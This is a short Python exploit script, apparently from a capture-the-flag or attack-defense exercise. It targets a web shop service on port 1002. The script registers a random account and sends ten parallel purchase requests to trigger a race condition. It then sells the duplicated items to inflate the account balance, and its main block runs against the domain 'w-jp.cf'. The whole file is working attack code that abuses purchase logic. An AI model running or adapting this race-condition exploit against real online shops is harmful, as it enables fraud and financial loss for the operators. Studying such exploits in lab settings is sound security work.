from requests import *
from multiprocessing import *
import utils
import re
match_ids = re.compile("<th scope=\"row\">(.+?)</th>")
match_bucks = re.compile("You have (.+?) bucks</div>")


def exploit(host):
    s = session()
    # reg
    un = utils.randomString()
    print(un)
    result = s.post(f"http://faster.{host}:1002/", data={
        "username": un,
        "password": "9pFrqCEyagsCbabGamT"
    }).content
    if b"Hello Our Precious Customers!" not in result:
        return 0, "Failed to login"
    # race cond buy
    def f():
        s.post(f"http://faster.{host}:1002/buy/1")

    ps = []
    for i in range(10):
        p = Process(target=f)
        ps.append(p)
        p.start()
    for i in ps:
        i.join()
    # sell
    result = s.get(f"http://faster.{host}:1002/").content
    ids = match_ids.findall(result.decode("utf-8"))
    for i in ids:
        s.post(f"http://faster.{host}:1002/sell/{i}")
    result = s.get(f"http://faster.{host}:1002/").content
    bucks = match_bucks.findall(str(result))
    if int(bucks[0]) <= 20:
        return 0, "Failed to exploit"
    return 1, ""

FUNCTIONS = [exploit]

if __name__ == "__main__":
    print(exploit("w-jp.cf"))